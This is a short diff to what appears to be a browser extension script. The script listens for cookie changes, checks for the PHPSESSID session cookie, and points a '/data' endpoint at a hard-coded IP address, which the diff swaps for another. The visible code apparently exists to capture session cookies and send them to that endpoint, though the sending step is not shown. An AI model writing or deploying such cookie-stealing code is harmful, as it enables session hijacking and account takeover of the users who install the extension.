@@ -1,6 +1,6 @@
 browser.cookies.onChanged.addListener((changeInfo) => {
     const cookie = changeInfo.cookie;
-    const ip = "https://192.168.10.169/data";
+    const ip = "https://10.64.134.132/data";
     
 
     if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
